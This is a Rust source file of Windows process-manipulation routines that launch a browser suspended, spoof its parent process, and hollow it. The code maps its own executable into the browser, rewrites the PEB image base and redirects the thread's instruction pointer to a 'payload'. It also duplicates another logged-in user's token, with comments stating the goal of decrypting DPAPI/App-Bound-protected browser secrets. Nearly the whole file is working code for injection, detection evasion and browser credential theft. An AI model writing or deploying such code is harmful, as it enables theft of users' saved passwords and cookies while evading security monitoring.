//! Process and memory primitives for the in-browser run: spawn the browser
//! suspended (optionally as the profile-owning user, with a spoofed parent),
//! map this executable into it as a genuine image section, plant the mailbox,
//! redirect the thread to our entry point, and sample the thread for crash
//! diagnostics.
#![allow(unsafe_code)]

use std::ffi::c_void;
use std::path::Path;

use windows_sys::Win32::Foundation::{LocalFree, GENERIC_READ, HANDLE};
use windows_sys::Win32::Security::Authorization::{
    ConvertSidToStringSidW, GetNamedSecurityInfoW, SE_FILE_OBJECT,
};
use windows_sys::Win32::Security::OWNER_SECURITY_INFORMATION;
use windows_sys::Win32::Security::{
    DuplicateTokenEx, GetTokenInformation, SecurityImpersonation, TokenPrimary,
    TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_ELEVATION, TOKEN_QUERY, TOKEN_USER,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_SHARE_READ, OPEN_EXISTING,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
};
use windows_sys::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use windows_sys::Win32::System::RemoteDesktop::{
    WTSEnumerateSessionsW, WTSFreeMemory, WTSQueryUserToken, WTS_SESSION_INFOW,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessAsUserW, CreateProcessW, GetCurrentProcess, GetExitCodeProcess, OpenProcess,
    OpenProcessToken, ResumeThread, TerminateProcess, UpdateProcThreadAttribute, CREATE_SUSPENDED,
    CREATE_UNICODE_ENVIRONMENT, DETACHED_PROCESS, EXTENDED_STARTUPINFO_PRESENT,
    PROCESS_CREATE_PROCESS, PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    STARTUPINFOEXW, STARTUPINFOW,
};

use super::{last_error, nt_error, wide, OwnedHandle};
use super::{SECTION_MAP_ALL, SEC_IMAGE, VIEW_SHARE};

/// `CONTEXT_FULL` for amd64 (CONTEXT_CONTROL | CONTEXT_INTEGER |
/// CONTEXT_FLOATING_POINT): enough to read/write Rip without asking for
/// debug registers (which need extra privilege).
const CONTEXT_FULL_AMD64: u32 = 0x10000B;
/// `WTSActive` (WTS_CONNECTSTATE_CLASS).
const WTS_ACTIVE: i32 = 0;
/// `ProcessBasicInformation` (PROCESSINFOCLASS).
const PROCESS_BASIC_INFORMATION: u32 = 0;
/// `TokenUser` / `TokenElevation` (TOKEN_INFORMATION_CLASS).
const TOKEN_USER_CLASS: i32 = 1;
const TOKEN_ELEVATION_CLASS: i32 = 20;
/// Still-running sentinel of `GetExitCodeProcess`.
const STILL_ACTIVE: u32 = 259;
/// Offset of `ImageBaseAddress` in the 64-bit PEB.
const PEB_IMAGE_BASE_OFFSET: usize = 0x10;

extern "system" {
    /// Not surfaced by the windows-sys features in use; a stable ntdll
    /// export.
    fn NtQueryInformationProcess(
        process: HANDLE,
        info_class: u32,
        info: *mut c_void,
        info_len: u32,
        return_len: *mut u32,
    ) -> i32;
}

/// A suspended (or finished) child process whose termination is guaranteed:
/// dropped on every exit path, closing the handles after terminating a still
/// running payload.
pub struct Child {
    process: OwnedHandle,
    thread: OwnedHandle,
    pid: u32,
}

impl Child {
    /// The child's PID.
    #[must_use]
    pub fn pid(&self) -> u32 {
        self.pid
    }

    fn process_handle(&self) -> HANDLE {
        self.process.raw()
    }

    fn thread_handle(&self) -> HANDLE {
        self.thread.raw()
    }
}

impl Drop for Child {
    fn drop(&mut self) {
        let mut code = 0u32;
        // SAFETY: live process handle.
        let running = unsafe { GetExitCodeProcess(self.process_handle(), &mut code) } != 0
            && code == STILL_ACTIVE;
        if running {
            // SAFETY: terminating our own child; the exit code is arbitrary.
            unsafe { TerminateProcess(self.process_handle(), 1) };
        }
        // Handles close via OwnedHandle's Drop.
    }
}

/// Builds the double-NUL-terminated environment block CreateProcess expects
/// (a custom block REPLACES the parent's environment — the child must not
/// inherit our variables).
fn env_block(pairs: &[(String, String)]) -> Vec<u16> {
    let mut out: Vec<u16> = Vec::new();
    for (key, value) in pairs {
        out.extend(wide(&format!("{key}={value}")));
    }
    out.push(0);
    out
}

/// Spawns `target` suspended, as this user, with `parent_pid` recorded as the
/// parent process (the child appears launched by the shell) when given.
pub fn spawn_suspended(
    target: &str,
    env: &[(String, String)],
    parent_pid: Option<u32>,
) -> anyhow::Result<Child> {
    spawn_with(None, target, env, parent_pid)
}

/// Spawns `target` suspended as `user` (a primary token, e.g. the profile
/// owner's), with the same parent-spoofing option.
pub fn spawn_suspended_as_user(
    user: HANDLE,
    target: &str,
    env: &[(String, String)],
    parent_pid: Option<u32>,
) -> anyhow::Result<Child> {
    spawn_with(Some(user), target, env, parent_pid)
}

fn spawn_with(
    user: Option<HANDLE>,
    target: &str,
    env: &[(String, String)],
    parent_pid: Option<u32>,
) -> anyhow::Result<Child> {
    let env = env_block(env);
    let mut attributes = AttributeList::new(parent_pid)?;
    let mut info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    let app_name = wide(target);
    let creation = CREATE_SUSPENDED
        | CREATE_UNICODE_ENVIRONMENT
        | DETACHED_PROCESS
        | EXTENDED_STARTUPINFO_PRESENT;
    // The STARTUPINFOEXW must outlive the CreateProcess call; the attribute
    // list buffer stays alive in `attributes` for the same span.
    let mut si: STARTUPINFOEXW = unsafe { std::mem::zeroed() };
    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
    if !attributes.buf.is_empty() {
        si.lpAttributeList = attributes.buf.as_mut_ptr().cast();
    }
    let startup = (&mut si as *mut STARTUPINFOEXW).cast::<STARTUPINFOW>();
    let ok = match user {
        Some(token) => {
            // SAFETY: `token` is a live primary token; `startup` points at a
            // valid STARTUPINFOEXW whose attribute list (if any) outlives the
            // call; `info` is valid for writes.
            unsafe {
                CreateProcessAsUserW(
                    token,
                    app_name.as_ptr(),
                    std::ptr::null_mut(),
                    std::ptr::null(),
                    std::ptr::null(),
                    0,
                    creation,
                    env.as_ptr().cast(),
                    std::ptr::null(),
                    startup,
                    &mut info,
                )
            }
        }
        None => {
            // SAFETY: same guarantees as the as-user arm without the token.
            unsafe {
                CreateProcessW(
                    app_name.as_ptr(),
                    std::ptr::null_mut(),
                    std::ptr::null(),
                    std::ptr::null(),
                    0,
                    creation,
                    env.as_ptr().cast(),
                    std::ptr::null(),
                    startup,
                    &mut info,
                )
            }
        }
    };
    if ok == 0 {
        return Err(last_error("CreateProcess(browser)"));
    }
    Ok(Child {
        process: OwnedHandle::new(info.hProcess),
        thread: OwnedHandle::new(info.hThread),
        pid: info.dwProcessId,
    })
}

/// A `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` list, kept alive across the
/// CreateProcess call. `_parent` only keeps the spoof-parent handle alive
/// for the list's lifetime.
struct AttributeList {
    buf: Vec<u8>,
    _parent: Option<OwnedHandle>,
}

impl AttributeList {
    fn new(parent_pid: Option<u32>) -> anyhow::Result<Self> {
        let mut parent = None;
        let mut buf = Vec::new();
        let Some(pid) = parent_pid else {
            return Ok(Self {
                buf,
                _parent: parent,
            });
        };
        // SAFETY: opening the spoof parent for PROCESS_CREATE_PROCESS.
        let handle = unsafe { OpenProcess(PROCESS_CREATE_PROCESS, 0, pid) };
        if handle.is_null() {
            return Err(last_error("OpenProcess(parent)"));
        }
        parent = Some(OwnedHandle::new(handle));

        let mut size = 0usize;
        // SAFETY: sizing call; `size` receives the required byte count.
        unsafe {
            InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut size);
        }
        if size == 0 {
            return Err(last_error("InitializeProcThreadAttributeList(size)"));
        }
        buf = vec![0u8; size];
        // SAFETY: `buf` is `size` bytes — the value the sizing call wrote.
        let ok =
            unsafe { InitializeProcThreadAttributeList(buf.as_mut_ptr().cast(), 1, 0, &mut size) };
        if ok == 0 {
            return Err(last_error("InitializeProcThreadAttributeList"));
        }
        let handle_ref = parent
            .as_ref()
            .map(OwnedHandle::raw)
            .unwrap_or(std::ptr::null_mut());
        // SAFETY: the list was just initialized; the attribute value is the
        // parent handle reference, valid until the list is deleted.
        let ok = unsafe {
            UpdateProcThreadAttribute(
                buf.as_mut_ptr().cast(),
                0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
                handle_ref.cast(),
                std::mem::size_of::<HANDLE>(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(last_error("UpdateProcThreadAttribute"));
        }
        Ok(Self {
            buf,
            _parent: parent,
        })
    }
}

impl Drop for AttributeList {
    fn drop(&mut self) {
        if !self.buf.is_empty() {
            // SAFETY: the list was successfully initialized (only non-empty
            // on that path) and is deleted exactly once.
            unsafe { DeleteProcThreadAttributeList(self.buf.as_mut_ptr().cast()) };
        }
    }
}

extern "system" {
    fn InitializeProcThreadAttributeList(
        attribute_list: *mut c_void,
        attribute_count: u32,
        flags: u32,
        size: *mut usize,
    ) -> i32;
    fn DeleteProcThreadAttributeList(attribute_list: *mut c_void);
}

/// Maps this executable (`image_path`) into `child` as a genuine `SEC_IMAGE`
/// section view at `preferred`, returning the actual base. The OS loader
/// accepts the view exactly like a normal process load, performing
/// relocation, import and TLS processing when the redirected thread starts.
pub fn map_image(
    child: &Child,
    image_path: &Path,
    preferred: *mut c_void,
) -> anyhow::Result<*mut c_void> {
    let wide_path = wide(&image_path.to_string_lossy());
    // SAFETY: opening our own executable read-only with normal sharing.
    let file = unsafe {
        CreateFileW(
            wide_path.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            std::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        )
    };
    if file.is_null() || file == -1isize as HANDLE {
        return Err(last_error("CreateFileW(own image)"));
    }
    let _file = OwnedHandle::new(file);

    let mut section: HANDLE = std::ptr::null_mut();
    // SAFETY: `_file` is a live handle; `section` valid for write.
    let status = unsafe {
        super::NtCreateSection(
            &mut section,
            SECTION_MAP_ALL,
            std::ptr::null(),
            std::ptr::null(),
            0,
            SEC_IMAGE,
            file,
        )
    };
    if status < 0 || section.is_null() {
        return Err(nt_error("NtCreateSection", status));
    }
    let _section = OwnedHandle::new(section);

    let mut base = preferred;
    let mut view_size = 0usize;
    // SAFETY: `section` and the child process are live; `base` requests the
    // preferred address (a just-created suspended process has essentially its
    // whole address space free, so the request is reliable).
    let status = unsafe {
        super::NtMapViewOfSection(
            section,
            child.process_handle(),
            &mut base,
            0,
            0,
            std::ptr::null(),
            &mut view_size,
            VIEW_SHARE,
            0,
            PAGE_READWRITE,
        )
    };
    if status < 0 {
        return Err(nt_error("NtMapViewOfSection", status));
    }
    Ok(base)
}

/// Locates the child's PEB and rewrites `ImageBaseAddress` to `base`, making
/// our mapped image the executable as far as the loader is concerned.
pub fn set_image_base(child: &Child, base: *mut c_void) -> anyhow::Result<()> {
    #[repr(C)]
    struct ProcessBasicInformation {
        exit_status: i32,
        peb: *mut c_void,
        affinity: usize,
        base_priority: i32,
        unique_id: usize,
        parent_pid: usize,
    }
    let mut pbi = ProcessBasicInformation {
        exit_status: 0,
        peb: std::ptr::null_mut(),
        affinity: 0,
        base_priority: 0,
        unique_id: 0,
        parent_pid: 0,
    };
    let mut returned = 0u32;
    // SAFETY: `pbi` is valid for `sizeof` writes for the call's duration.
    let status = unsafe {
        NtQueryInformationProcess(
            child.process_handle(),
            PROCESS_BASIC_INFORMATION,
            (&mut pbi as *mut ProcessBasicInformation).cast(),
            std::mem::size_of::<ProcessBasicInformation>() as u32,
            &mut returned,
        )
    };
    if status < 0 || pbi.peb.is_null() {
        return Err(nt_error("NtQueryInformationProcess", status));
    }
    write_memory(
        child,
        (pbi.peb as usize + PEB_IMAGE_BASE_OFFSET) as *mut c_void,
        &(base as u64).to_le_bytes(),
    )
}

/// Reads `buf.len()` bytes from `child` at `addr`.
pub fn read_memory(child: &Child, addr: *mut c_void, buf: &mut [u8]) -> anyhow::Result<()> {
    let mut read = 0usize;
    // SAFETY: `addr` is readable in the child for `buf.len()` bytes on
    // success; `buf` is valid for writes.
    let ok = unsafe {
        ReadProcessMemory(
            child.process_handle(),
            addr,
            buf.as_mut_ptr().cast(),
            buf.len(),
            &mut read,
        )
    };
    if ok == 0 || read != buf.len() {
        return Err(last_error("ReadProcessMemory"));
    }
    Ok(())
}

/// Writes `bytes` to `child` at `addr`.
pub fn write_memory(child: &Child, addr: *mut c_void, bytes: &[u8]) -> anyhow::Result<()> {
    let mut written = 0usize;
    // SAFETY: `bytes` is readable for its length; `addr` is writable in the
    // child for that many bytes on success.
    let ok = unsafe {
        WriteProcessMemory(
            child.process_handle(),
            addr,
            bytes.as_ptr().cast(),
            bytes.len(),
            &mut written,
        )
    };
    if ok == 0 || written != bytes.len() {
        return Err(last_error("WriteProcessMemory"));
    }
    Ok(())
}

/// Commits `len` bytes at `addr` in `child` (the fixed mailbox address).
pub fn alloc_at(child: &Child, addr: *mut c_void, len: usize) -> anyhow::Result<*mut c_void> {
    // SAFETY: request at the exact address; a just-created suspended process
    // has that range free.
    let base = unsafe {
        VirtualAllocEx(
            child.process_handle(),
            addr,
            len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if base.is_null() {
        return Err(last_error("VirtualAllocEx"));
    }
    Ok(base)
}

/// Redirects the child's primary thread to `entry` (image base + entry RVA).
pub fn set_entry(child: &Child, entry: *const c_void) -> anyhow::Result<()> {
    let mut ctx: CONTEXT = unsafe { std::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    // SAFETY: `ctx` is valid for the context size; the thread is suspended.
    let ok = unsafe { GetThreadContext(child.thread_handle(), &mut ctx) };
    if ok == 0 {
        return Err(last_error("GetThreadContext"));
    }
    ctx.Rip = entry as u64;
    // SAFETY: `ctx` was just filled by the successful GetThreadContext.
    let ok = unsafe { SetThreadContext(child.thread_handle(), &ctx) };
    if ok == 0 {
        return Err(last_error("SetThreadContext"));
    }
    Ok(())
}

/// Samples the child's primary thread instruction pointer (crash
/// diagnostics: brackets where a dead payload stopped).
pub fn thread_rip(child: &Child) -> anyhow::Result<u64> {
    let mut ctx: CONTEXT = unsafe { std::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    // SAFETY: `ctx` is valid for the context size; sampling is lock-free.
    let ok = unsafe { GetThreadContext(child.thread_handle(), &mut ctx) };
    if ok == 0 {
        return Err(last_error("GetThreadContext(sample)"));
    }
    Ok(ctx.Rip)
}

/// Resumes the child's primary thread; the loader initializes our image
/// (imports, TLS, .pdata) and then starts our normal `main`, which detects
/// the mailbox marker and runs the payload protocol.
pub fn resume(child: &Child) -> anyhow::Result<()> {
    // SAFETY: the thread is suspended and ours.
    if unsafe { ResumeThread(child.thread_handle()) } == u32::MAX {
        return Err(last_error("ResumeThread"));
    }
    Ok(())
}

/// The child's exit code, or `None` while still running.
pub fn exit_code(child: &Child) -> anyhow::Result<Option<u32>> {
    let mut code = 0u32;
    // SAFETY: `code` valid for write; the handle is live.
    let ok = unsafe { GetExitCodeProcess(child.process_handle(), &mut code) };
    if ok == 0 {
        return Err(last_error("GetExitCodeProcess"));
    }
    Ok((code != STILL_ACTIVE).then_some(code))
}

/// Resolves a primary token for the user that owns `user_data`, but only
/// when we are elevated AND the owner differs from us (an elevated run must
/// still unwrap DPAPI/ABE secrets in the owner's logon context). `None`
/// means "spawn in our own context" — the documented fallback whenever the
/// owner cannot be resolved or impersonated.
pub(crate) fn owner_token_for(user_data: &Path) -> Option<OwnedHandle> {
    let owner = file_owner_sid(user_data)?;
    let ours = current_user_sid()?;
    if owner == ours {
        return None;
    }
    if !elevated()? {
        return None;
    }
    // Find the owner's interactive session and clone a primary token from it.
    let mut sessions: *mut WTS_SESSION_INFOW = std::ptr::null_mut();
    let mut count = 0u32;
    // SAFETY: out-params valid for write; `sessions` is freed with
    // WTSFreeMemory on every path.
    let ok =
        unsafe { WTSEnumerateSessionsW(std::ptr::null_mut(), 0, 1, &mut sessions, &mut count) };
    if ok == 0 || sessions.is_null() {
        return None;
    }
    let mut found = None;
    for i in 0..count as isize {
        // SAFETY: `sessions` points at `count` consecutive entries.
        let session = unsafe { &*sessions.offset(i) };
        if session.State != WTS_ACTIVE {
            continue;
        }
        let mut token: HANDLE = std::ptr::null_mut();
        // SAFETY: `token` valid for write.
        let ok = unsafe { WTSQueryUserToken(session.SessionId, &mut token) };
        if ok == 0 || token.is_null() {
            continue;
        }
        let sid_matches = token_user_sid(token)
            .map(|sid| sid == owner)
            .unwrap_or(false);
        if sid_matches {
            let mut primary: HANDLE = std::ptr::null_mut();
            // SAFETY: `token` is live; `primary` valid for write.
            let ok = unsafe {
                DuplicateTokenEx(
                    token,
                    TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                    std::ptr::null(),
                    SecurityImpersonation,
                    TokenPrimary,
                    &mut primary,
                )
            };
            if ok != 0 && !primary.is_null() {
                found = Some(OwnedHandle::new(primary));
            }
        }
        // SAFETY: closing the session token we opened.
        unsafe { windows_sys::Win32::Foundation::CloseHandle(token) };
        if found.is_some() {
            break;
        }
    }
    // SAFETY: freeing the enumeration buffer allocated by
    // WTSEnumerateSessionsW.
    unsafe { WTSFreeMemory(sessions.cast()) };
    found
}

/// Whether this process is running elevated.
fn elevated() -> Option<bool> {
    // SAFETY: returns our own pseudo-handle (never closed).
    let process = unsafe { GetCurrentProcess() };
    let mut token: HANDLE = std::ptr::null_mut();
    // SAFETY: `token` valid for write.
    let ok = unsafe { OpenProcessToken(process, TOKEN_QUERY, &mut token) };
    if ok == 0 || token.is_null() {
        return None;
    }
    let mut elevation: TOKEN_ELEVATION = unsafe { std::mem::zeroed() };
    let mut returned = 0u32;
    // SAFETY: `elevation` is valid for `sizeof` writes.
    let ok = unsafe {
        GetTokenInformation(
            token,
            TOKEN_ELEVATION_CLASS,
            (&mut elevation as *mut TOKEN_ELEVATION).cast(),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut returned,
        )
    };
    // SAFETY: closing the token we opened.
    unsafe { windows_sys::Win32::Foundation::CloseHandle(token) };
    (ok != 0).then_some(elevation.TokenIsElevated != 0)
}

/// This process's user SID as a string SID.
fn current_user_sid() -> Option<String> {
    // SAFETY: our own pseudo-handle (never closed).
    let process = unsafe { GetCurrentProcess() };
    let mut token: HANDLE = std::ptr::null_mut();
    // SAFETY: `token` valid for write.
    let ok = unsafe { OpenProcessToken(process, TOKEN_QUERY, &mut token) };
    if ok == 0 || token.is_null() {
        return None;
    }
    let sid = token_user_sid(token);
    // SAFETY: closing the token we opened.
    unsafe { windows_sys::Win32::Foundation::CloseHandle(token) };
    sid
}

/// The user SID (string form) behind a token.
fn token_user_sid(token: HANDLE) -> Option<String> {
    // Size the TOKEN_USER buffer generously (a SID can be up to 68 bytes; a
    // fixed 128-byte tail is far beyond any real group SID too).
    #[repr(C)]
    struct TokenUserBuf {
        user: TOKEN_USER,
        tail: [u8; 256],
    }
    let mut buf = TokenUserBuf {
        user: unsafe { std::mem::zeroed() },
        tail: [0u8; 256],
    };
    let mut returned = 0u32;
    // SAFETY: `buf` is valid for `sizeof(TokenUserBuf)` writes.
    let ok = unsafe {
        GetTokenInformation(
            token,
            TOKEN_USER_CLASS,
            (&mut buf as *mut TokenUserBuf).cast(),
            std::mem::size_of::<TokenUserBuf>() as u32,
            &mut returned,
        )
    };
    if ok == 0 {
        return None;
    }
    sid_to_string(buf.user.User.Sid)
}

/// Converts a raw SID pointer to its string form (S-1-5-21-...).
fn sid_to_string(sid: *mut c_void) -> Option<String> {
    if sid.is_null() {
        return None;
    }
    let mut out: *mut u16 = std::ptr::null_mut();
    // SAFETY: `sid` is a live SID; `out` valid for write. The string is
    // LocalAlloc'd and freed below.
    let ok = unsafe { ConvertSidToStringSidW(sid.cast(), &mut out) };
    if ok == 0 || out.is_null() {
        return None;
    }
    let mut len = 0usize;
    // SAFETY: `out` is NUL-terminated.
    while unsafe { *out.add(len) } != 0 {
        len += 1;
    }
    // SAFETY: `out` readable for `len` wide chars.
    let value = String::from_utf16_lossy(unsafe { std::slice::from_raw_parts(out, len) });
    // SAFETY: freeing the string allocated by ConvertSidToStringSidW.
    unsafe { LocalFree(out.cast()) };
    Some(value)
}

/// The owner SID (string form) of a file or directory.
fn file_owner_sid(path: &Path) -> Option<String> {
    let mut owner: *mut c_void = std::ptr::null_mut();
    // SAFETY: `path` is a valid wide string; `owner` valid for write. Only
    // the owner is requested, so no descriptor is allocated for us to free
    // (the returned owner pointer refers to memory owned by the SD, which we
    // do not receive).
    let status = unsafe {
        GetNamedSecurityInfoW(
            wide(&path.to_string_lossy()).as_ptr(),
            SE_FILE_OBJECT,
            OWNER_SECURITY_INFORMATION,
            &mut owner,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };
    if status != 0 || owner.is_null() {
        return None;
    }
    sid_to_string(owner)
}
